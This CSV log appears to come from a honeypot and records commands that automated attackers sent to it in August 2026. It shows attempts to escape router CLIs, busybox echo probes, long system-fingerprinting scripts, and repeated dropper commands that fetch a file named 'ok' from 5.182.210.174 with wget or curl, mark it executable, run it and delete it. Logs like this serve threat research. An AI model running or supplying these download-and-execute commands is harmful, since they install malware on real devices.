timestamp,src_ip,session,input,failed
2026-08-26 21:00:40.342438+00:00,39.34.191.157,07607dd040e4,sh,False
2026-08-26 21:00:40.376285+00:00,39.34.191.157,07607dd040e4,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x55\x46\x43\x55\x57',False
2026-08-26 21:09:46.280138+00:00,43.230.94.185,6064c7f5dda1,start,False
2026-08-26 21:09:46.281163+00:00,43.230.94.185,6064c7f5dda1,start ,True
2026-08-26 21:09:46.282153+00:00,43.230.94.185,6064c7f5dda1,enable,False
2026-08-26 21:09:46.282979+00:00,43.230.94.185,6064c7f5dda1,enable ,True
2026-08-26 21:09:46.284805+00:00,43.230.94.185,6064c7f5dda1,config terminal,False
2026-08-26 21:09:46.285652+00:00,43.230.94.185,6064c7f5dda1,config terminal,True
2026-08-26 21:09:46.286511+00:00,43.230.94.185,6064c7f5dda1,system,False
2026-08-26 21:09:46.287273+00:00,43.230.94.185,6064c7f5dda1,system ,True
2026-08-26 21:09:46.288519+00:00,43.230.94.185,6064c7f5dda1,linuxshell,False
2026-08-26 21:09:46.289489+00:00,43.230.94.185,6064c7f5dda1,linuxshell ,True
2026-08-26 21:09:46.290284+00:00,43.230.94.185,6064c7f5dda1,su,False
2026-08-26 21:09:46.291763+00:00,43.230.94.185,6064c7f5dda1,shell,False
2026-08-26 21:09:46.292691+00:00,43.230.94.185,6064c7f5dda1,shell ,True
2026-08-26 21:09:46.293425+00:00,43.230.94.185,6064c7f5dda1,sh,False
2026-08-26 21:09:46.304280+00:00,43.230.94.185,6064c7f5dda1,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x54\x4c\x42\x41\x45\x54',False
2026-08-26 22:10:51.605226+00:00,45.198.224.26,74c4a427a7a6,(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &,False
2026-08-26 22:10:51.606151+00:00,45.198.224.26,74c4a427a7a6,cd /tmp,False
2026-08-26 22:10:51.607239+00:00,45.198.224.26,74c4a427a7a6,wget http://5.182.210.174/ok,False
2026-08-26 22:10:51.637144+00:00,45.198.224.26,74c4a427a7a6,curl -O http://5.182.210.174/ok,False
2026-08-26 22:10:51.644488+00:00,45.198.224.26,74c4a427a7a6,chmod +x ok,False
2026-08-26 22:10:51.646424+00:00,45.198.224.26,74c4a427a7a6,sh ok,False
2026-08-26 22:10:51.647967+00:00,45.198.224.26,74c4a427a7a6,rm -rf ok,False
2026-08-26 22:10:51.649763+00:00,45.198.224.26,74c4a427a7a6,rm -rf ok.1,False
2026-08-26 22:10:51.652208+00:00,45.198.224.26,74c4a427a7a6,& ,True
2026-08-26 22:10:51.668892+00:00,45.198.224.26,74c4a427a7a6,(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &,False
2026-08-26 22:10:51.670433+00:00,45.198.224.26,74c4a427a7a6,cd /tmp,False
2026-08-26 22:10:51.671644+00:00,45.198.224.26,74c4a427a7a6,cd /var/tmp,False
2026-08-26 22:10:51.673014+00:00,45.198.224.26,74c4a427a7a6,cd /dev,False
2026-08-26 22:10:51.674402+00:00,45.198.224.26,74c4a427a7a6,rm -rf ok ok.1,False
2026-08-26 22:10:51.675593+00:00,45.198.224.26,74c4a427a7a6,busybox wget http://5.182.210.174/ok,False
2026-08-26 22:10:51.677752+00:00,45.198.224.26,74c4a427a7a6,wget http://5.182.210.174/ok,False
2026-08-26 22:10:51.681626+00:00,45.198.224.26,74c4a427a7a6,/userfs/bin/wget http://5.182.210.174/ok,False
2026-08-26 22:10:51.683094+00:00,45.198.224.26,74c4a427a7a6,/userfs/bin/wget http://5.182.210.174/ok,True
2026-08-26 22:10:51.684666+00:00,45.198.224.26,74c4a427a7a6,curl -O http://5.182.210.174/ok,False
2026-08-26 22:10:51.689074+00:00,45.198.224.26,74c4a427a7a6,busybox curl -O http://5.182.210.174/ok,False
2026-08-26 22:10:51.691390+00:00,45.198.224.26,74c4a427a7a6,chmod 777 ok,False
2026-08-26 22:10:51.692998+00:00,45.198.224.26,74c4a427a7a6,./ok,False
2026-08-26 22:10:51.693586+00:00,45.198.224.26,74c4a427a7a6,./ok ,True
2026-08-26 22:10:51.694139+00:00,45.198.224.26,74c4a427a7a6,sh ok,False
2026-08-26 22:10:51.695359+00:00,45.198.224.26,74c4a427a7a6,busybox sh ok,False
2026-08-26 22:10:51.697441+00:00,45.198.224.26,74c4a427a7a6,rm -rf ok ok.1,False
2026-08-26 22:10:51.699216+00:00,45.198.224.26,74c4a427a7a6,& ,True
2026-08-26 22:10:51.700216+00:00,45.198.224.26,74c4a427a7a6,exit,False
2026-08-26 22:15:46.651589+00:00,183.83.217.184,a0b342a64f23,enable,False
2026-08-26 22:15:46.652784+00:00,183.83.217.184,a0b342a64f23,enable ,True
2026-08-26 22:15:47.095110+00:00,183.83.217.184,a0b342a64f23,system,False
2026-08-26 22:15:47.096274+00:00,183.83.217.184,a0b342a64f23,system ,True
2026-08-26 22:15:47.501650+00:00,183.83.217.184,a0b342a64f23,shell,False
2026-08-26 22:15:47.502730+00:00,183.83.217.184,a0b342a64f23,shell ,True
2026-08-26 22:15:47.908336+00:00,183.83.217.184,a0b342a64f23,sh,False
2026-08-26 22:15:48.316526+00:00,183.83.217.184,a0b342a64f23,/bin/busybox TOKEN,False
2026-08-27 02:29:25.612854+00:00,91.92.40.31,a4cfe0b71059,uname -s -v -n -r -m,False
2026-08-27 03:01:30.761955+00:00,92.118.39.50,063b4888ce96,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""LAST:$last_output""; echo ""FILTER:$filter_output""",False
2026-08-27 03:01:30.764121+00:00,92.118.39.50,063b4888ce96,uname -s -v -n -m 2 > /dev/null,False
2026-08-27 03:01:30.766910+00:00,92.118.39.50,063b4888ce96,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-08-27 03:01:30.770017+00:00,92.118.39.50,063b4888ce96,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-08-27 03:01:30.787288+00:00,92.118.39.50,063b4888ce96,busybox uname -s -v -n -m 2 > /dev/null,False
2026-08-27 03:01:30.789186+00:00,92.118.39.50,063b4888ce96,busybox uname -s -v -n -m,True
2026-08-27 03:01:30.790629+00:00,92.118.39.50,063b4888ce96,( [ -f /proc/version ],False
2026-08-27 03:01:30.791534+00:00,92.118.39.50,063b4888ce96,[ -f /proc/version ],False
2026-08-27 03:01:30.795710+00:00,92.118.39.50,063b4888ce96,head -1 /proc/version | cut -d -f1,False
2026-08-27 03:01:30.809487+00:00,92.118.39.50,063b4888ce96,[ -f /etc/os-release ],False
2026-08-27 03:08:10.104364+00:00,77.239.124.252,ea69c5b5b61e,uname -s -v -n -r -m,False
2026-08-27 04:17:05.390106+00:00,77.239.124.252,6be347e982d4,uname -s -v -n -r -m,False
2026-08-27 04:40:04.402834+00:00,59.103.100.121,73f42b11011e,start,False
2026-08-27 04:40:04.403633+00:00,59.103.100.121,73f42b11011e,start ,True
2026-08-27 04:40:04.404503+00:00,59.103.100.121,73f42b11011e,enable,False
2026-08-27 04:40:04.405463+00:00,59.103.100.121,73f42b11011e,enable ,True
2026-08-27 04:40:04.408040+00:00,59.103.100.121,73f42b11011e,config terminal,False
2026-08-27 04:40:04.408903+00:00,59.103.100.121,73f42b11011e,config terminal,True
2026-08-27 04:40:04.410608+00:00,59.103.100.121,73f42b11011e,system,False
2026-08-27 04:40:04.411496+00:00,59.103.100.121,73f42b11011e,system ,True
2026-08-27 04:40:04.412734+00:00,59.103.100.121,73f42b11011e,linuxshell,False
2026-08-27 04:40:04.415926+00:00,59.103.100.121,73f42b11011e,linuxshell ,True
2026-08-27 04:40:04.417408+00:00,59.103.100.121,73f42b11011e,su,False
2026-08-27 04:40:04.424320+00:00,59.103.100.121,73f42b11011e,shell,False
2026-08-27 04:40:04.426281+00:00,59.103.100.121,73f42b11011e,shell ,True
2026-08-27 04:40:04.427964+00:00,59.103.100.121,73f42b11011e,sh,False
2026-08-27 04:40:04.439259+00:00,59.103.100.121,73f42b11011e,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x49\x53\x49\x41\x50\x4a',False
2026-08-27 04:40:04.463826+00:00,59.103.100.121,73f42b11011e,/bin/busybox echo -e \x49\x53\x49\x41\x50\x4a,True
2026-08-27 04:40:43.979238+00:00,59.103.100.121,2cd5cae86ae6,start,False
2026-08-27 04:40:43.980237+00:00,59.103.100.121,2cd5cae86ae6,start ,True
2026-08-27 04:40:43.981547+00:00,59.103.100.121,2cd5cae86ae6,enable,False
2026-08-27 04:40:43.982486+00:00,59.103.100.121,2cd5cae86ae6,enable ,True
2026-08-27 04:40:43.983899+00:00,59.103.100.121,2cd5cae86ae6,config terminal,False
2026-08-27 04:40:43.984740+00:00,59.103.100.121,2cd5cae86ae6,config terminal,True
2026-08-27 04:40:43.985636+00:00,59.103.100.121,2cd5cae86ae6,system,False
2026-08-27 04:40:43.986366+00:00,59.103.100.121,2cd5cae86ae6,system ,True
2026-08-27 04:40:43.987370+00:00,59.103.100.121,2cd5cae86ae6,linuxshell,False
2026-08-27 04:40:43.988075+00:00,59.103.100.121,2cd5cae86ae6,linuxshell ,True
2026-08-27 04:40:43.988806+00:00,59.103.100.121,2cd5cae86ae6,su,False
2026-08-27 04:40:43.990440+00:00,59.103.100.121,2cd5cae86ae6,shell,False
2026-08-27 04:40:43.991228+00:00,59.103.100.121,2cd5cae86ae6,shell ,True
2026-08-27 04:40:43.991925+00:00,59.103.100.121,2cd5cae86ae6,sh,False
2026-08-27 04:40:44.002951+00:00,59.103.100.121,2cd5cae86ae6,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x49\x53\x49\x41\x50\x4a',False
2026-08-27 04:40:44.014361+00:00,59.103.100.121,2cd5cae86ae6,/bin/busybox echo -e \x49\x53\x49\x41\x50\x4a,True
2026-08-27 04:46:04.367197+00:00,91.92.42.7,d5afee5def84,uname -s -v -n -r -m,False
2026-08-27 06:15:47.689067+00:00,180.76.239.185,3991037ca7ee,uname -s -m,False
2026-08-27 07:00:22.450647+00:00,80.94.92.179,5f57fa341272,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""LAST:$last_output""; echo ""FILTER:$filter_output""",False
2026-08-27 07:00:22.453018+00:00,80.94.92.179,5f57fa341272,uname -s -v -n -m 2 > /dev/null,False
2026-08-27 07:00:22.455474+00:00,80.94.92.179,5f57fa341272,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-08-27 07:00:22.457861+00:00,80.94.92.179,5f57fa341272,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-08-27 07:00:22.462455+00:00,80.94.92.179,5f57fa341272,busybox uname -s -v -n -m 2 > /dev/null,False
2026-08-27 07:00:22.463939+00:00,80.94.92.179,5f57fa341272,busybox uname -s -v -n -m,True
2026-08-27 07:00:22.467270+00:00,80.94.92.179,5f57fa341272,( [ -f /proc/version ],False
2026-08-27 07:00:22.467911+00:00,80.94.92.179,5f57fa341272,[ -f /proc/version ],False
2026-08-27 07:00:22.470044+00:00,80.94.92.179,5f57fa341272,head -1 /proc/version | cut -d -f1,False
2026-08-27 07:00:22.473307+00:00,80.94.92.179,5f57fa341272,[ -f /etc/os-release ],False
2026-08-27 07:08:46.467053+00:00,45.198.224.26,d6a8f3575bb2,(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &,False
2026-08-27 07:08:46.468287+00:00,45.198.224.26,d6a8f3575bb2,cd /tmp,False
2026-08-27 07:08:46.469922+00:00,45.198.224.26,d6a8f3575bb2,wget http://5.182.210.174/ok,False
2026-08-27 07:08:46.541773+00:00,45.198.224.26,d6a8f3575bb2,curl -O http://5.182.210.174/ok,False
2026-08-27 07:08:46.547701+00:00,45.198.224.26,d6a8f3575bb2,chmod +x ok,False
2026-08-27 07:08:46.551599+00:00,45.198.224.26,d6a8f3575bb2,sh ok,False
2026-08-27 07:08:46.553468+00:00,45.198.224.26,d6a8f3575bb2,rm -rf ok,False
2026-08-27 07:08:46.555879+00:00,45.198.224.26,d6a8f3575bb2,rm -rf ok.1,False
2026-08-27 07:08:46.558397+00:00,45.198.224.26,d6a8f3575bb2,& ,True
2026-08-27 07:08:46.578303+00:00,45.198.224.26,d6a8f3575bb2,(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &,False
2026-08-27 07:08:46.580574+00:00,45.198.224.26,d6a8f3575bb2,cd /tmp,False
2026-08-27 07:08:46.582923+00:00,45.198.224.26,d6a8f3575bb2,cd /var/tmp,False
2026-08-27 07:08:46.586019+00:00,45.198.224.26,d6a8f3575bb2,cd /dev,False
2026-08-27 07:08:46.588018+00:00,45.198.224.26,d6a8f3575bb2,rm -rf ok ok.1,False
2026-08-27 07:08:46.589803+00:00,45.198.224.26,d6a8f3575bb2,busybox wget http://5.182.210.174/ok,False
2026-08-27 07:08:46.591045+00:00,45.198.224.26,d6a8f3575bb2,busybox wget http://5.182.210.174/ok,True
2026-08-27 07:08:46.591896+00:00,45.198.224.26,d6a8f3575bb2,wget http://5.182.210.174/ok,False
2026-08-27 07:08:46.596115+00:00,45.198.224.26,d6a8f3575bb2,/userfs/bin/wget http://5.182.210.174/ok,False
2026-08-27 07:08:46.597419+00:00,45.198.224.26,d6a8f3575bb2,/userfs/bin/wget http://5.182.210.174/ok,True
2026-08-27 07:08:46.598690+00:00,45.198.224.26,d6a8f3575bb2,curl -O http://5.182.210.174/ok,False
2026-08-27 07:08:46.602977+00:00,45.198.224.26,d6a8f3575bb2,busybox curl -O http://5.182.210.174/ok,False
2026-08-27 07:08:46.604119+00:00,45.198.224.26,d6a8f3575bb2,busybox curl -O http://5.182.210.174/ok,True
2026-08-27 07:08:46.605484+00:00,45.198.224.26,d6a8f3575bb2,chmod 777 ok,False
2026-08-27 07:08:46.608775+00:00,45.198.224.26,d6a8f3575bb2,./ok,False
2026-08-27 07:08:46.609843+00:00,45.198.224.26,d6a8f3575bb2,./ok ,True
2026-08-27 07:08:46.610620+00:00,45.198.224.26,d6a8f3575bb2,sh ok,False
2026-08-27 07:08:46.613192+00:00,45.198.224.26,d6a8f3575bb2,busybox sh ok,False
2026-08-27 07:08:46.614653+00:00,45.198.224.26,d6a8f3575bb2,busybox sh ok,True
2026-08-27 07:08:46.615673+00:00,45.198.224.26,d6a8f3575bb2,rm -rf ok ok.1,False
2026-08-27 07:08:46.618283+00:00,45.198.224.26,d6a8f3575bb2,& ,True
2026-08-27 07:08:46.619750+00:00,45.198.224.26,d6a8f3575bb2,exit,False
2026-08-27 07:22:35.908100+00:00,115.57.184.196,c6a45756ce16,start,False
2026-08-27 07:22:35.909472+00:00,115.57.184.196,c6a45756ce16,start ,True
2026-08-27 07:22:35.910398+00:00,115.57.184.196,c6a45756ce16,enable,False
2026-08-27 07:22:35.911115+00:00,115.57.184.196,c6a45756ce16,enable ,True
2026-08-27 07:22:35.912245+00:00,115.57.184.196,c6a45756ce16,config terminal,False
2026-08-27 07:22:35.913339+00:00,115.57.184.196,c6a45756ce16,config terminal,True
2026-08-27 07:22:35.914476+00:00,115.57.184.196,c6a45756ce16,system,False
2026-08-27 07:22:35.915610+00:00,115.57.184.196,c6a45756ce16,system ,True
2026-08-27 07:22:35.916882+00:00,115.57.184.196,c6a45756ce16,linuxshell,False
2026-08-27 07:22:35.917850+00:00,115.57.184.196,c6a45756ce16,linuxshell ,True
2026-08-27 07:22:35.918693+00:00,115.57.184.196,c6a45756ce16,su,False
2026-08-27 07:22:35.920311+00:00,115.57.184.196,c6a45756ce16,shell,False
2026-08-27 07:22:35.921157+00:00,115.57.184.196,c6a45756ce16,shell ,True
2026-08-27 07:22:35.921875+00:00,115.57.184.196,c6a45756ce16,sh,False
2026-08-27 07:22:35.938552+00:00,115.57.184.196,c6a45756ce16,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x5a\x53\x48\x50\x59',False
2026-08-27 07:22:35.949824+00:00,115.57.184.196,c6a45756ce16,/bin/busybox echo -e \x45\x5a\x53\x48\x50\x59,True
2026-08-27 08:14:41.750849+00:00,153.117.32.121,974534824eca,start,False
2026-08-27 08:14:41.751722+00:00,153.117.32.121,974534824eca,start ,True
2026-08-27 08:14:41.753242+00:00,153.117.32.121,974534824eca,enable,False
2026-08-27 08:14:41.754671+00:00,153.117.32.121,974534824eca,enable ,True
2026-08-27 08:14:41.756153+00:00,153.117.32.121,974534824eca,config terminal,False
2026-08-27 08:14:41.757307+00:00,153.117.32.121,974534824eca,config terminal,True
